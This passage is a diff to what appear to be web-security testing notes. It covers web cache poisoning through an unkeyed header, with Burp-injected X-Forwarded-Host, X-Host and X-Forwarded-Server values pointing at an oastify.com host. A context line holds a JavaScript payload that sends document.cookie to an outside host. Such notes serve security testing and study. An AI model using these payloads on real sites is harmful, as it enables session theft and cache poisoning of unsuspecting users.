@@ -17,3 +17,12 @@ document.location='https://OASTIFY.COM/?cookies='+document.cookie;
 
 # Web cache poisoning with an unkeyed header
 
+The application supports the use of a custom HTTP header to override the Host header, and uses a cache that can be manipulated into saving responses that have been influenced by this header.  
+  
+Burp added the following headers to the request:  
+  
+X-Forwarded-Host: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com  
+X-Host: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com  
+X-Forwarded-Server: wvv7qb16dsbmfio5z8d5hum5bwhp5gt9uxkka8z.oastify.com
+
+
